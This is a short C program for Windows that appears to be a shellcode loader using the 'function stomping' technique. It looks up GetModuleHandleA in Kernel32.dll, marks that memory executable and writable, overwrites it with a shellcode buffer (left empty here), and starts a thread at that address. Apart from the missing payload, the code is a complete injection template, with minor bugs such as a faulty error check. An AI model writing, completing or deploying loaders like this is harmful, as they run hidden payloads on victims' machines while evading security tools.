#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>

#define dll "Kernel32.dll"
#define sac_func "GetModuleHandleA"


int main() {



	LPVOID sac_funcaddr = GetProcAddress(GetModuleHandleA(dll), sac_func);

	unsigned char shellcode[] = {
	

	};

	unsigned char* pshellcode = shellcode;

	SIZE_T szshellcode = sizeof(shellcode);



	printf("The sac func address is %lp", sac_funcaddr);

	if (sac_func == 0) {

		printf("The getprocaddress failed with error no %d\n", GetLastError());
	}

	DWORD oldprotection = NULL;
	if (!VirtualProtect(sac_funcaddr, szshellcode, PAGE_EXECUTE_READWRITE, &oldprotection)) {
		printf("virtual protect failed to execute %d\n", GetLastError());
	}


	memcpy(sac_funcaddr, (LPVOID)pshellcode, szshellcode);



	getchar();

	HANDLE hthread = CreateThread(NULL, NULL, sac_funcaddr, NULL, NULL, NULL);


	//printf("The size of function getprocaddress is %ld",;


	if (hthread == NULL) {
		printf("createthread failed with error no %d\n", GetLastError());
	}



	printf("press <enter> to exit");
	getchar();
}